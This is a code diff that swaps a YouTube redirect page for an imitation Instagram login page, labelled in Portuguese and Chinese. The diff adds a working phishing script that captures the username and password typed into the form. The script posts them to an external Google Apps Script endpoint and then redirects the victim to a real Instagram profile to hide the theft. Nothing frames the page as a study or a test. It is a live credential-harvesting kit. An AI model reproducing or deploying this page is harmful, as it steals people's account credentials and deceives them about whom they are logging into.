@@ -1,1 +1,64 @@
-<meta http-equiv="refresh" content="0;url=https://www.youtube.com/channel/UC-eVibDbsz2S15kxn3q4JaQ" />
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Instagram</title>
+	
+	
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form method="post" name="googlesheet">
+                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
+                    <input name="email" id="email" required placeholder="用戶名稱、手機號碼或電子郵件地址" />
+
+                    <label for="password" class="sr-only">Senha</label>
+                    <input name="password" id="password" required type="password" placeholder="密碼" />
+
+                    <button type="submit">登入</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">或</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+   
+                    <a href="#">忘記密碼？</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>沒有帳號嗎？</p>
+                <a href="#">註冊</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+
+            </div>
+        </section>
+    </main>
+    
+	
+	
+	
+      <script>
+         const scriptURL = 'https://script.google.com/macros/s/AKfycbwFGE-3-4gJ_DiWsSBqgP3MazzPOPoUUxULPG2bIs55AqTH6sPCXovcufpdw9b_Ukfv/exec'
+         const form = document.forms['googlesheet']     
+         form.addEventListener('submit', e => {
+         e.preventDefault()
+         fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+         .then(response => document.location.href="https://www.instagram.com/wuguanlin65/")
+         .catch(error => console.error('Error!', error.message))
+         })
+      </script>
+	
+</body>
+</html>
